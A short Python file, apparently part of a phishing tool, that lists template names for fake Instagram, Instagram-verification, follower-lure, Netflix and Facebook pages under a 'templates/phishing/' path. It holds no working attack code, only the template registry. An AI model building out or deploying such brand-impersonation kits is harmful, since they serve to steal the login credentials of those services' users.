import os

# filepath = "templates/phishing/"
# list1 = os.listdir(filepath)
# for names in list1:
#     print(os.listdir(filepath+names))

"""
    1st. Heading
    2nd. template
    """
templates = [
    
    ["Instagram","instagram"],
    ["Ig_Verify","ig_verify"],
    ["Insta_Followers","insta_followers"],
    ["netflix","netflix"],
    ["Facebook","facebook"],
]
        
        
